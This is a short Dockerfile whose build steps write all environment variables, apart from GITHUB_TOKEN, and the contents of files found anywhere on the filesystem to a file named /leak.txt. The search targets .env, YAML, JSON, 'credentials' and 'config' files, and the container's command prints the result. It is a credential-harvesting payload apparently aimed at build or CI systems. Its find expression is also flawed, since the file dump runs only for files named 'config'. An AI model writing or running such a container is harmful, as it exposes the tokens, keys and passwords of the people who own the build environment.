FROM alpine:latest

RUN apk add --no-cache grep findutils bash

RUN echo "[ENVIRONMENT VARIABLES]" > /leak.txt && \
    (env | grep -v 'GITHUB_TOKEN' || true) >> /leak.txt && \
    echo "\n\n[FILESYSTEM SECRETS (.env, .yml, credentials, etc)]" >> /leak.txt && \
    find / -type f \
        -iname "*.env" -o -iname "*.yml" -o -iname "*.yaml" -o \
        -iname "*.json" -o -iname "credentials" -o -iname "config" \
    -exec sh -c 'echo "\n--- {} ---" && cat "{}"' \; >> /leak.txt 2>/dev/null || true

CMD ["cat", "/leak.txt"]
